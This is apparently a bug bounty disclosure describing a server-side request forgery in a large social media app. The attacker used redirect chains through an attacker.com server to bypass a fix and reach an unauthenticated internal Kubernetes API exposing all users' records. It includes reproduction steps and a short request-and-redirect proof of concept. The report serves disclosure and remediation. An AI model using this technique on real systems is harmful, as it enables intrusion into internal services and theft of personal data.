# Title: Full-Blown SSRF to Gain Access to Millions of Users' Records

- **Platform**: HackerOne
- **Program**: Public Program (80M+ active users)
- **Severity**: Critical
- **Date**: 2025-04-10
- **Researcher**: Skyer
- **Bounty**: Undisclosed

## Summary
A full-blown server-side request forgery vulnerability was discovered in a social media application with over 80 million active users. The SSRF allowed access to internal Kubernetes services, including an unprotected internal API that exposed data on all users — millions of records.

## Technical Details
The researcher discovered that an API endpoint in the target application automatically followed redirects when making HTTP requests. By setting up an attacker-controlled server that returned redirect responses to internal IP addresses, the researcher could force the application server to make requests to internal services.

The initial SSRF was fixed by the program, but the researcher found the fix could be bypassed by using a redirect chain. The fix only blocked direct requests to non-target.com domains but didn't account for redirects.

Once SSRF was confirmed, the researcher:
1. Discovered the application was running on Kubernetes
2. Brute-forced internal Kubernetes DNS names: `<service>.svc.cluster.local`
3. Found `internal-service.target.com:80` returned "It's alive!"
4. Fuzzed the internal service and found `/applications` endpoint
5. This endpoint had NO authorization — it returned data for ALL users

## Steps to Reproduce
1. Find the vulnerable endpoint that follows redirects
2. Set up an attacker server that returns `302` redirect to internal IPs
3. Send a request to the attacker server
4. Monitor the internal service discovery
5. Find the unprotected internal API: `http://internal-service.target.com:80/applications`
6. Access millions of user records without authentication

## Proof of Concept
```
POST /vulnerable-endpoint HTTP/1.1
Host: target.com
Content-Type: application/json

{"url": "https://attacker.com/redirect"}
```

Attacker server response:
```
HTTP/1.1 302 Found
Location: http://internal-service.target.com:80/applications
```

Accessing the internal endpoint revealed data for millions of users.

## Impact
- Access to millions of user records (PII, contact info, etc.)
- Unauthorized access to internal Kubernetes services
- Complete bypass of authorization controls on internal APIs
- The main application's API only returned data for the authenticated user, but the internal service had no access controls
- Data exfiltration at massive scale

## Remediation
The program fixed the vulnerability by:
1. Preventing redirects from external to internal addresses
2. Adding authentication to the internal `/applications` endpoint
3. Implementing network segmentation between services
4. Adding proper authorization checks to internal APIs
5. Removing the automatic redirect-following behavior

## References
- https://medium.com/@skycer_00/full-blown-ssrf-to-gain-access-to-millions-of-users-records-and-multiple-internal-panels-3719d9b802e9
